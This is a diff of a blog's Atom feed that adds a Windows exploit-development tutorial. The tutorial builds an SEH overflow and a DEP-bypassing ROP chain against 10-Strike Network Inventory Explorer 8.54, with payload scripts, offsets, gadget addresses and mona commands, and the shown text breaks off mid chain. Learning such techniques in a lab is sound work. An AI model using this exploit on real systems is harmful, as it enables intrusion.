@@ -1,4 +1,288 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/blog/" rel="alternate" type="text/html" /><updated>2021-03-26T19:12:37+07:00</updated><id>http://localhost:4000/blog/feed.xml</id><title type="html">MobAppSec-Blog</title><subtitle>Mobile Application security and ARM Exploit Development</subtitle><entry><title type="html">Android Application Security [chapter 0x1] - Introduction to Frida</title><link href="http://localhost:4000/blog/android_application_security/2021/03/25/android_application_security_chapter_0x1.html" rel="alternate" type="text/html" title="Android Application Security [chapter 0x1] - Introduction to Frida" /><published>2021-03-25T10:44:25+07:00</published><updated>2021-03-25T10:44:25+07:00</updated><id>http://localhost:4000/blog/android_application_security/2021/03/25/android_application_security_chapter_0x1</id><content type="html" xml:base="http://localhost:4000/blog/android_application_security/2021/03/25/android_application_security_chapter_0x1.html">&lt;p&gt;Hello world!&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/blog/" rel="alternate" type="text/html" /><updated>2021-07-05T09:05:22+07:00</updated><id>http://localhost:4000/blog/feed.xml</id><title type="html">MobAppSec-Blog</title><subtitle>Mobile Application security and ARM Exploit Development</subtitle><entry><title type="html">Windows Exploit Development [chapter 0x1] - Revisiting ROP Chain in Windows 7: 10-Strike Network Inventory Explorer 8.54</title><link href="http://localhost:4000/blog/windows_exploit_development/2021/07/04/windows_exploit_development_chapter_0x1.html" rel="alternate" type="text/html" title="Windows Exploit Development [chapter 0x1] - Revisiting ROP Chain in Windows 7: 10-Strike Network Inventory Explorer 8.54" /><published>2021-07-04T10:44:25+07:00</published><updated>2021-07-04T10:44:25+07:00</updated><id>http://localhost:4000/blog/windows_exploit_development/2021/07/04/windows_exploit_development_chapter_0x1</id><content type="html" xml:base="http://localhost:4000/blog/windows_exploit_development/2021/07/04/windows_exploit_development_chapter_0x1.html">&lt;p&gt;Hello world!&lt;/p&gt;
+
+&lt;p&gt;Before we getting start with the content, I would like to mentioned that this material is not meant for beginner. If you never done Windows Exploit Development before I suggest to start reading my old blog about breaking the code series(&lt;a href=&quot;https://court-of-testing-analysing.blogspot.com/2019/11/breaking-code-exploit-development.html&quot;&gt;link&lt;/a&gt;) this will give a general idea on how to setup and conduct research on windows binary.&lt;/p&gt;
+
+&lt;p&gt;This post was inspired from the following &lt;a href=&quot;https://www.exploit-db.com/exploits/46283&quot;&gt;exploit-db&lt;/a&gt;. You may notice later that I used different exploit to gain control of the program but the approach still the same with the original author.&lt;/p&gt;
+
+&lt;h2&gt; Setup Windows Lab &lt;/h2&gt;
+
+&lt;p&gt;In this lab I used Windows 7 from windows IE developer official (&lt;a href=&quot;https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/&quot;&gt;website&lt;/a&gt;) and install several tools for exploit development in it, such as:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Python 2.7&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Immunity Debugger&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Mona&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The vulnerable program, you can download it from the following &lt;a href=&quot;https://www.exploit-db.com/exploits/46283&quot;&gt;link&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Note 1: DEP is set to always ON!&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp1.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;DEP is stands for Data Execution Prevention. This security mechanism is used to make the stack area of program to be not executable, thus, this means if we try to put shellcode in the stack it will failed. To bypass this protection, we will use ROP(Return Oriented Programming) to reuse the code inside the program to call virtualprotect function in order to make the stack area executable again.&lt;/p&gt;
+
+&lt;p&gt;Note 2: Exploit offset calculation is based on the how long is the username of the windows machine, in this case my username is IEUser.&lt;/p&gt;
+
+&lt;p&gt;Note 3: To get accurate result when debugging the exploit, everytime the program crash you need to detach the immunity debugger, restart the program and attach it again. I know it’s a lot of work.&lt;/p&gt;
+
+&lt;h2&gt; Crash and Take Over the Program EIP &lt;/h2&gt;
+
+&lt;p&gt;First, we need to crash the program and take over the EIP register. This register is the one responsible to control the execution flow.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2000&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;payload.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[!] payload.txt ready to uploaded&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The following python code will generate a payload.txt file that will crash the program by overwritting the EIP register. Upload the file by go to the “computer” section and choose “From Text File”.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp2.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then go to the immunity debugger, you need to type “shift+f9” to jump the SEH exception to get the following result. If you having trouble to used this shortcut you can go to virtualbox options “input” &amp;gt; “keyboard” &amp;gt; “Soft Keyboard” to emulate this shortcut.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp3.png&quot; alt=&quot;PLIST-FILE_3&quot; height=&quot;300px&quot; width=&quot;300px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At this stage, we need to know at what offset in our input to gain control of the EIP register, we will be using one of the mona features to generate pattern for the payload.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp4.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To get the pattern you can go to immunity folder and look for pattern.txt file. Copied the content under ASCII section and update the previous python source code to used this payload.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp5.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp6.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Upload the new payload to the vulnerable program and don’t forgot to pass the exception using “shift+f9” shortcut. The EIP now is overwrite with the pattern, next we will use mona feature to get the exact location of our input to control the EIP.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;mona findmsp&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp7.png&quot; alt=&quot;PLIST-FILE_3&quot; height=&quot;300px&quot; width=&quot;300px&quot; /&gt;&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp8.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the following command, we are able to identify the offset of our EIP which is 207. But how about the SEH exception? that would be not much of problem, why? if you look closely the SEH is located 4 bytes(211) after the EIP so all we need to do is to find a gadget that jump to the next 8 or more bytes in the stack so we will no get caught up in the SEH exception.&lt;/p&gt;
+
+&lt;p&gt;There are a lot of gadgets inside the program that can be used to satisfy the condition but because I’m lazy, I’m just going to used the one that suggested by the original author. It’s located at 0x10013e29 and it points to instructions:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ESP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xC&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;RETN&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;this instructions basically will increment the ESP value to 12 bytes, thus, this will jump the nSEH and SEH and make the execution return to the stack. Update the source code:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;207&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;eip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10013e29&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;payload.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[!] payload.txt ready to uploaded&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Put breakpoint at 0x10013e29, so we know that the exploit is working. I suggest to use hardware breakpont in immunity debugger so you don’t have to put breakpoint multiple times. After that you can upload the new payload and pass the exception, at the end you will be end up at your breakpoint like below:&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp9.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp10.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Continue the execution by click “step over” 2 times this will make the program jump next 10 bytes and return the execution to the stack, cool!&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp11.png&quot; alt=&quot;PLIST-FILE_3&quot; height=&quot;300px&quot; width=&quot;300px&quot; /&gt;&lt;/p&gt;
+
+&lt;h2&gt; Constructing ROP Chain &lt;/h2&gt;
+
+&lt;p&gt;Now, it’s time to create the ROP Chain so we can reuse the instruction in the program and execute virtualprotect() function.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;VirtualProtect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;SIZE_T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;flNewProtect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;PDWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpflOldProtect&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Some tips to create ROP Chain in windows, make sure to use gadgets that the following features is set to false:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Rebase, although this is not security mechanism. This module will move instructions of used modules inside the program if there is conflicted address.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;ASLR, randomize the instructions of the library&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;You can check it using mona by using this command:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;mona modules&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp12.png&quot; alt=&quot;PLIST-FILE_3&quot; height=&quot;300px&quot; width=&quot;700px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In shorts, there are 4 DLL that we can used to construct ROP chain:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;sqlite3.dll&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;ssleay32.dll&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;MSVCR71.dll&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;LIBEAV32.dll&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Using this information lets create ROP chain using mona:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;mona rop &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; sqlite3.dll,ssleay32.dll,MSVCR71.dll,LIBEAV32.dll &lt;span class=&quot;nt&quot;&gt;-cpb&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1a&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;the following command instruct mona create ROP Chain with 4 modules that have mentioned before and make sure the instructions don’t have this 4 bad characters. We need to get rid this 4 bad characters, so our exploit is not altered at runtime.&lt;/p&gt;
+
+&lt;p&gt;So this is going to be my strategy to construct the ROP:&lt;/p&gt;
+
+&lt;p&gt;As we know 32 bit binary used stack to put the parameter of called function, thus, I will used pushad instruction that will get all of the content of registers and put it in the stack following this order:&lt;/p&gt;
+
+&lt;p&gt;EAX, ECX, EDX, EBX, EBP, ESI and EDI&lt;/p&gt;
+
+&lt;p&gt;Each of this register will be contain the following value(I combined the ROP Chain by using rop_chain.txt and rop.txt file that generated by mona using the previous command):&lt;/p&gt;
+
+&lt;p&gt;EAX -&amp;gt; Virtualprotect() function pointer&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span class=&quot;nf&quot;&gt;POP&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RETN&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;IAT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;VirtualProtect&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;ECX -&amp;gt; Address of any location inside the program that is writable (lpfOldProtect)&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span class=&quot;nf&quot;&gt;POP&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ECX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RETN&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x7c38c777&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;EDX -&amp;gt; Protection level flag 0x40(set to be executable again) (flNewProtect). Since there is going to be null byte we are going to use neg instruction that will flip each of the bits.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span class=&quot;nf&quot;&gt;POP&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EDX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RET&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;xffffffc0&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;NEG&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EDX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RET&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;EBX -&amp;gt; Affected number of bytes we will set this to 0x201(shellcode size, more or less) (dwSize).&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span class=&quot;nf&quot;&gt;POP&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RET&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;xfffffdff&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;NEG&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RET&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;POP&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EBX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RET&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;xffffffff&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;INC&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EBX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RET&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;ADD&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EBX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt; 
+&lt;span class=&quot;nf&quot;&gt;XOR&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RETN&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;EBP -&amp;gt; Any gadget that will return the execution back to the stack&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span class=&quot;nf&quot;&gt;POP&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EBP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RET&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;POP&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EBP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RET&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;EDI -&amp;gt; ROP NOP(JUNK)&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span class=&quot;nf&quot;&gt;POP&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EDI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RET&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;RET&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;ESI -&amp;gt; Jump to EAX to execute VirtualProtect(). To get the pointer we will used mona again:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;mona find &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; instr &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;JMP DWORD PTR DS:[EAX]&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; sqlite3.dll,ssleay32.dll,MSVCR71.dll,LIBEAV32.dll &lt;span class=&quot;nt&quot;&gt;-cpb&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1a&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span class=&quot;nf&quot;&gt;POP&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ESI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RET&lt;/span&gt;
